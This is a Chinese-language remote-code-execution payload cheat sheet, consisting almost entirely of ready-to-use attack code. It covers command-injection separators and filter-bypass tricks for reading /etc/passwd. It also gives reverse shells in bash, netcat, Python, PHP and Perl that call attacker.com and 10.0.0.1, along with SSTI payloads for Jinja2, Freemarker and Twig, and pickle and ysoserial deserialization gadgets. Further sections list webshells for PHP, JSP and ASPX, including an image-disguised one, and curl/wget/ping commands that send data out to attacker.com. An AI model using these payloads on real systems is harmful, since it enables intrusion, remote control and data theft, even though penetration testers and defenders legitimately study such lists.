# RCE Payload 参考手册

## 命令注入

### 命令分隔符

```bash
; id
| id
|| id
& id
&& id
`id`
$(id)
%0aid
\nid
```

### 常用命令

```bash
id
whoami
uname -a
cat /etc/passwd
ls -la
pwd
env
```

### 反弹 Shell

```bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
nc -e /bin/bash attacker.com 4444
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## 代码注入

### PHP

```php
system($_GET['cmd']);
exec($_GET['cmd']);
passthru($_GET['cmd']);
shell_exec($_GET['cmd']);
eval($_GET['code']);
assert($_GET['code']);
preg_replace('/.*/e', $_GET['code'], '');
```

### Python

```python
eval(user_input)
exec(user_input)
os.system(user_input)
subprocess.call(user_input, shell=True)
__import__('os').system(user_input)
```

## 模板注入 (SSTI)

### Jinja2 (Python)

```python
{{7*7}}
{{config}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
```

### Freemarker (Java)

```java
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

### Twig (PHP)

```php
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

## 反序列化

### Python pickle

```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
```

### Java (ysoserial)

```bash
java -jar ysoserial.jar CommonsCollections1 'id' | base64
java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}'
```

### PHP

```php
O:8:"stdClass":1:{s:4:"test";s:2:"id";}
// 利用 __wakeup, __destruct 等魔术方法
```

## 文件上传 Webshell

### PHP

```php
<?php system($_GET['cmd']); ?>
<?php eval($_POST['code']); ?>
<?=`$_GET[0]`?>
<?php passthru($_REQUEST['cmd']); ?>

// 图片马
GIF89a<?php system($_GET['cmd']); ?>

// .htaccess
AddType application/x-httpd-php .jpg
```

### JSP

```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

### ASPX

```aspx
<%@ Page Language="C#" %><%System.Diagnostics.Process.Start(Request["cmd"]);%>
```

## 反弹 Shell 合集

### Bash

```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
```

### Netcat

```bash
nc -e /bin/bash 10.0.0.1 4444
nc -c /bin/bash 10.0.0.1 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
```

### Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP

```php
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## 绕过技术

### 空格绕过

```bash
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
cat	/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
```

### 关键字绕过

```bash
# 拼接
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# 变量
a=c;b=at;$a$b /etc/passwd

# Base64
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# 十六进制
$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')

# 通配符
/???/??t /???/p??s??
cat /e?c/p?sswd
cat /e*c/p*d
```

### 无回显 RCE

```bash
# DNS 外带
curl http://`whoami`.attacker.com
ping -c 1 `whoami`.attacker.com

# HTTP 外带
curl http://attacker.com/?data=`cat /etc/passwd | base64`
wget http://attacker.com/?data=$(id)

# 时间盲注
if [ $(whoami | cut -c 1) = "r" ]; then sleep 5; fi

# 写文件
id > /var/www/html/output.txt
```
